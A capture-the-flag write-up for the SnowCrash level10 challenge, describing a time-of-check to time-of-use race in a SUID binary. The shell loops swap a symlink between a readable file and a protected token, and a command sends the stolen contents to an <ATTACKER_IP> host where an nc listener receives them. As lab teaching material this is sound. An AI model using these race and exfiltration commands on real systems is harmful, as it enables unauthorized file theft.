# Level10 – SnowCrash

## Objective
Exploit a race condition in a SUID binary to read a protected file (`token`) owned by `flag10`.

## Reconnaissance
The home directory contains:
- A SUID binary `level10` (owned by `flag10`)
- A restricted file `token` (readable only by `flag10`)

`strings` reveals the binary:
- Checks file access using `access()`
- Opens and reads the file
- Sends its content over a TCP connection to a remote host on port `6969`
Dynamic analysis confirms:
```bash
access("/tmp/test", 4) = -1
```
The program verifies read permissions before opening the file.
This is a classic Time-of-Check to Time-of-Use (TOCTOU) vulnerability.

### Vulnerability
The binary logic is essentially:
```bash
1. access(file, R_OK)
2. open(file)
3. read(file)
4. send(file_content)
```
The issue:
- `access()` checks permissions using the real UID
- `open()` runs with effective UID (`flag10`) because the binary is SUID
  
If the file is replaced between the check and the use, the binary can be tricked into opening a restricted file.
This creates a race condition.

## Exploitation
We exploit the race using a symbolic link that rapidly switches between:
- A readable file
- The protected token
1. Create a readable file
```bash
echo "test" > /tmp/test
```
2. Launch the race condition loop
```bash
while true; do
    ln -sf /tmp/test /tmp/getpasswd
    ln -sf /home/user/level10/token /tmp/getpasswd
done
```
3. Spam the SUID binary
```bash
while true; do
    ./level10 /tmp/getpasswd <ATTACKER_IP>
done
```
- `access()` validates /tmp/test
- The symlink switches to token
- `open()` reads the protected file as `flag10`

4. Listen on attacker machine
```bash
nc -lk 6969
```

## Flag
![Level10 Flag Screenshot](images/level10_flag.png)

